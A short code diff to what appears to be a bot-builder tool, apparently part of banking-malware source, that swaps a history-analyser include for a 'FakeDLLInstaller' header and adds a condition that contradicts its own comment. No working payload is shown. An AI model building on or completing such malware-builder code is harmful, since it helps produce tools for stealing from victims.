@@ -19,7 +19,7 @@
 #include "Sber.h"
 #include "Rafa.h"
 #include "cc.h"
-#include "HistoryAnalizer.h"
+#include "FakeDLLInstaller.h"
 #include "DllLoader.h"
 
 //---------------------------------------------------------------------------
@@ -324,7 +324,8 @@ void __fastcall TBotBuilder::LoadSourceFile(const UnicodeString &FileName)
 				else
 				{
 					// Параметр отключен, забиваем его место нулями
-					Param->WriteEmptyData(Buf, BufSize);
+					if (Param->Enabled)
+						Param->WriteEmptyData(Buf, BufSize);
                 }
 			}
 		}
